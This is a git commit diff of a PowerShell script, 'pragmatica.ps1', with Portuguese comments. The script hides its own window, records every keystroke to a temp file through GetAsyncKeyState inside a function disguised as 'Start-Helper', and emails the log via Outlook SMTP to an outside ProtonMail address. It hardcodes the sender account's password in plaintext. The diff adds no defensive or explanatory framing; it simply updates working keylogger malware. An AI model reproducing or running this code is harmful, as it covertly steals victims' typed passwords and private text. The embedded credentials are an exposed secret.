20d3d8a4a57693fcb54e3ea02ecc3e05e1dd8e72
cLohan <82850047+cLohan@users.noreply.github.com>
2024-05-26 18:23:22 -0300

    Update pragmatica.ps1

--- pragmatica.ps1
+++ pragmatica.ps1
@@ -1,26 +1,38 @@
-$t = '[DllImport("user32.dll")] public static extern bool ShowWindow(int handle, int state);'
-add-type -name win -member $t -namespace native
-[native.win]::ShowWindow(([System.Diagnostics.Process]::GetCurrentProcess() | Get-Process).MainWindowHandle, 0)
+# Código para esconder a janela do PowerShell
+$t = @"
+using System;
+using System.Runtime.InteropServices;
 
+public class WinAPI
+{
+    [DllImport("user32.dll", SetLastError = true)]
+    public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+}
+"@
+Add-Type -TypeDefinition $t
+$handle = (Get-Process -Id $PID).MainWindowHandle
+if ($handle -ne [IntPtr]::Zero) {
+    [WinAPI]::ShowWindow($handle, 0)
+}
+
+# Configurações de envio de e-mail
 $TimesToRun = 1
-$RunTimeP = 1	# Tempo em minutos
+$RunTimeP = 1 # Tempo em minutos
 $From = "luccasmachado001@outlook.com"
 $Pass = "hbzgnuqauqooxcbq"
 $To = "carlosalberto58@protonmail.com"
 $Subject = "pragmatica"
 $body = "report"
-$SMTPServer = "smtp-mail.outlook.com"	# Outlook SMTP
+$SMTPServer = "smtp-mail.outlook.com" # SMTP do Outlook
 $SMTPPort = "587"
 $credentials = New-Object Management.Automation.PSCredential $From, ($Pass | ConvertTo-SecureString -AsPlainText -Force)
 
-############################
 $TimeStart = Get-Date
 $TimeEnd = $TimeStart.AddMinutes($RunTimeP)
 
-# Requires -Version 2
-function Start-Helper($Path="$env:temp\help.txt") 
-{
-  $signatures = @'
+# Requer PowerShell versão 2
+function Start-Helper($Path="$env:temp\help.txt") {
+    $signatures = @'
 [DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
 public static extern short GetAsyncKeyState(int virtualKeyCode); 
 [DllImport("user32.dll", CharSet=CharSet.Auto)]
@@ -31,48 +43,46 @@ public static extern int MapVirtualKey(uint uCode, int uMapType);
 public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
 '@
 
-  $API = Add-Type -MemberDefinition $signatures -Name 'Win32' -Namespace API -PassThru
+    $API = Add-Type -MemberDefinition $signatures -Name 'Win32' -Namespace API -PassThru
 
-  $null = New-Item -Path $Path -ItemType File -Force
+    $null = New-Item -Path $Path -ItemType File -Force
 
-  try
-  {
-    $Runner = 0
-    while ($TimesToRun -ge $Runner) {
-      while ($TimeEnd -ge (Get-Date)) {
-        Start-Sleep -Milliseconds 40
-        
-        for ($ascii = 9; $ascii -le 254; $ascii++) {
-          $state = $API::GetAsyncKeyState($ascii)
+    try {
+        $Runner = 0
+        while ($TimesToRun -ge $Runner) {
+            while ($TimeEnd -ge (Get-Date)) {
+                Start-Sleep -Milliseconds 40
+                
+                for ($ascii = 9; $ascii -le 254; $ascii++) {
+                    $state = $API::GetAsyncKeyState($ascii)
 
-          if ($state -eq -32767) {
-            $null = [console]::CapsLock
+                    if ($state -eq -32767) {
+                        $null = [console]::CapsLock
 
-            $virtualKey = $API::MapVirtualKey($ascii, 3)
+                        $virtualKey = $API::MapVirtualKey($ascii, 3)
 
-            $kbstate = New-Object Byte[] 256
-            $checkkbstate = $API::GetKeyboardState($kbstate)
+                        $kbstate = New-Object Byte[] 256
+                        $checkkbstate = $API::GetKeyboardState($kbstate)
 
-            $mychar = New-Object -TypeName System.Text.StringBuilder
+                        $mychar = New-Object -TypeName System.Text.StringBuilder
 
-            $success = $API::ToUnicode($ascii, $virtualKey, $kbstate, $mychar, $mychar.Capacity, 0)
+                        $success = $API::ToUnicode($ascii, $virtualKey, $kbstate, $mychar, $mychar.Capacity, 0)
 
-            if ($success) 
-            {
-              [System.IO.File]::AppendAllText($Path, $mychar, [System.Text.Encoding]::Unicode) 
+                        if ($success) {
+                            [System.IO.File]::AppendAllText($Path, $mychar, [System.Text.Encoding]::Unicode)
+                        }
+                    }
+                }
             }
-          }
+            Send-MailMessage -From $From -To $To -Subject $Subject -Body $body -Attachments $Path -SmtpServer $SMTPServer -Port $SMTPPort -Credential $credentials -UseSsl
+            Remove-Item -Path $Path -Force
+            $Runner++
+            $TimeEnd = (Get-Date).AddMinutes($RunTimeP)
         }
-      }
-      Send-MailMessage -From $From -To $To -Subject $Subject -Body $body -Attachment $Path -SmtpServer $SMTPServer -Port $SMTPPort -Credential $credentials -UseSsl
-      Remove-Item -Path $Path -Force
-      $Runner++
     }
-  }
-  finally
-  {
-    exit 1
-  }
+    finally {
+        exit 1
+    }
 }
 
 Start-Helper
